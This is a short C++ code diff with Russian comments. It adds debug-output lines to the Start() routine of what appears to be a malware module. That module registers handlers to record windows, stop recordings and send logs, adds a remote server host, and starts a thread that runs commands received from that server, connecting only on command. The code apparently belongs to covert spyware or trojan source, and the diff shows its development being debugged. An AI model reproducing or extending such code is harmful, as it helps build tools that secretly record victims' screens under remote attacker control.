@@ -698,6 +698,7 @@ DWORD WINAPI CallbackCmd( DWORD server, DWORD cmd, char* inData, int lenInData, 
 bool Start()
 {
 	dll = new TVideoRecDLL();
+	//dll->SetNotFree(true);
 	m_memset( servers, 0, sizeof(servers) );
 	//запускаем менеджер видео процесса в режиме спячки, т. е. соединяться с сервером будет только по команде
 	//или при передаче данных
@@ -710,9 +711,12 @@ bool Start()
 		VDRDBG( "Video", "Add server ip '%s'", VIDEO_REC_HOST2 );
 		char namePipe[64];
 		pipe = PIPE::CreateProcessPipe( GetNamePipe(namePipe), false );
+//		pOutputDebugStringA( "1" );
 		if( pipe )
 		{
+//		pOutputDebugStringA( "2" );
 			PIPE::RegisterMessageHandler( pipe, HandlerInit, 0, GetStr(VideoRecFuncInit).t_str(), 0 );
+//		pOutputDebugStringA( "3" );
 
 			PIPE::RegisterMessageHandler( pipe, HandlerRecordVideo, 0, GetStr(VideoRecFuncRecordWnd).t_str(), 0 );
 			PIPE::RegisterMessageHandler( pipe, HandlerStopRecord, 0, GetStr(VideoRecFuncStop).t_str(), 0 );
@@ -724,6 +728,7 @@ bool Start()
 			PIPE::RegisterMessageHandler( pipe, HandlerSendLog, 0, GetStr(VideoRecFuncSendLog).t_str(), 0 );
 
 			dll->RunCmdExec( servers[0], CallbackCmd ); //запуск потока выполнения команд от сервера
+//		pOutputDebugStringA( "4" );
 
 			if( PIPE::StartProcessPipe(pipe) )
 			{
@@ -734,6 +739,7 @@ bool Start()
 				PIPE::FreeProcessPipe(pipe);
 		}
 	}
+		pOutputDebugStringA( "5" );
 	delete dll;
 	return false;;
 }
